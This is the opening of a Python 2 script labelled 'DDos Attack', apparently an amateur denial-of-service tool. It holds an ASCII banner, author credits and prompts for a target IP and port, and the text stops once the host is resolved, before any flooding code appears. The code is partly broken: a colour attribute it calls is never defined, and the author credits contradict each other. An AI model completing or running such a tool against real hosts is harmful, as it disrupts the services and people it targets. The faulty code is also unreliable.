#!/usr/bin/python
# This code write by (Mr.nope)
# DDos Attack
from colorama import Fore,init
import time
import os
import sys
import socket
import thread
init()
def cls():
    os.system("clear")
class color:
    red = '\033[91m'
    green = '\033[92m'
    End = '\033[0m'
    red = '\033[33m'
def menu():
    os.system("printf '\033]2;DDos-Attack\a'")
    cls()
    print color.green + """
 ______   ______   _______  _______         _______  _______  _______  _______  _______  ___   _
|      | |      | |       ||       |       |   _   ||       ||       ||   _   ||       ||   | | |
|  _    ||  _    ||   _   ||  _____| ____  |  |_|  ||_     _||_     _||  |_|  ||       ||   |_| |
| | |   || | |   ||  | |  || |_____ |____| |       |  |   |    |   |  |       ||       ||      _|
| |_|   || |_|   ||  |_|  ||_____  |       |       |  |   |    |   |  |       ||      _||     |_
|       ||       ||       | _____| |       |   _   |  |   |    |   |  |   _   ||     |_ |    _  |
|______| |______| |_______||_______|       |__| |__|  |___|    |___|  |__| |__||_______||___| |_|\n""" + color.red + """
     ----[    This code write by (MR.ROBOT)   ]---
     -------[ github :""" + color.blue + """ https://github.com/hiddenpeson1899/hiddenperson666 ]-----------""" + color.End
    web = raw_input("\nEnter Target ip: ")
    time.sleep(1)
    port = input("\nEnter Target port: ")
    victim_ip = socket.gethostbyname(web)
